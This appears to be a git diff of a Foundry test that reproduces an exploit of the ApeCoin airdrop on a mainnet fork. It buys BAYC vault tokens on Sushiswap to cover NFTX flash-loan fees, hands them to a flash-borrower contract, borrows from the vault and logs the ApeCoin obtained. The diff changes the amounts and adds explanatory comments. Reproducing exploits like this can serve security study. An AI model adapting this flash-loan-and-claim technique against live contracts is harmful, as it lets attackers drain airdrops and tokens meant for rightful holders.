@@ -7,25 +7,6 @@ import "forge-std/Test.sol";
 import "forge-std/Vm.sol";
 import "forge-std/console.sol";
 
-
-interface AirdropGrapesToken {
-    function claimTokens() external ;
-}
-
-interface nftxvault {
-    function flashloan(address,address,uint,bytes memory ) external ;
-
-    function allowance (address,address) external view returns (uint) ;
-}
-
-
-interface IERC20{
-    function balanceOf(address) external view returns (uint256);
-    function approve(address,uint) external returns (bool);
-    function transfer(address,uint) external returns (bool);
-}
-
-
 library SafeMathUniswap {
     function add(uint x, uint y) internal pure returns (uint z) {
         require((z = x + y) >= x, 'ds-math-add-overflow');
@@ -99,16 +80,7 @@ library UniswapV2Library {
 interface IUniswapV2Pair {
     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
 }
-// interface IERC20{
-//     function balanceOf(address) external view returns (uint256);
-//     function approve(address,uint) external returns (bool);
-//     function transfer(address,uint) external returns (bool);
-// }
 
-
-// interface nftxvault {
-//     function flashloan(address,address,uint,bytes memory ) external ;
-// }
 
 interface Sushiswap{
     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
@@ -135,19 +107,23 @@ contract ContractTest is Test {
         sushi = Sushiswap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
         flashborrower = new FlashBorrower();
    
+// Here we are buying some BAYC tokens thorugh sushiswap to pay the flash loan fees of NFTx vault.
+// We are swapping Eth to get 0.4 bayc according to the price at that time
         address[] memory path = new address[](2);
         path[0]= 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
         path[1]= 0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5;
         uint[] memory amounts= new uint[](2);
         IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F,100000000000000000000);
         vm.deal(address(BoredApeowner),50000000000000000000);
+        
         vm.prank(address(BoredApeowner));
-        uint[] memory amount  = UniswapV2Library.getAmountsIn(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac,200000000000000000,path);
-        sushi.swapETHForExactTokens{value: amount[0] }(200000000000000000,path,address((BoredApeowner)),block.timestamp + 100);
-        uint bal = IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).balanceOf(address(this));
+        uint[] memory amount  = UniswapV2Library.getAmountsIn(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac,400000000000000000,path);
+        sushi.swapETHForExactTokens{value: amount[0] }(400000000000000000,path,address((BoredApeowner)),block.timestamp + 100);
+        // Transferring the bayc coins to the flash borrower contract . 
+        vm.prank(address(BoredApeowner));
+        IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).transfer(address(flashborrower),400000000000000000);
+        uint bal = IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).balanceOf(address(flashborrower));
         console.log("balance of BAYC tokens sushi swap",bal);
-        vm.prank(address(BoredApeowner));
-        IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).transfer(address(flashborrower),200000000000000000);
     }
 
 
@@ -159,7 +135,10 @@ contract ContractTest is Test {
         // airdropclaimcontract.claimTokens();
         // console.log(IERC20(apecoin).balanceOf(BoredApeowner));
         vm.label(address(flashborrower),"botcontract");
-       flashborrower.flashBorrow(address(vault),address(vault),10000000000000000000);
+        // calling the borrow function of the flash borrower contract
+       flashborrower.flashBorrow(address(vault),address(vault),5000000000000000000);
+       // checking if we successfully received ape coins 
+       console.log(IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381).balanceOf(address(flashborrower)));
     }
     
    
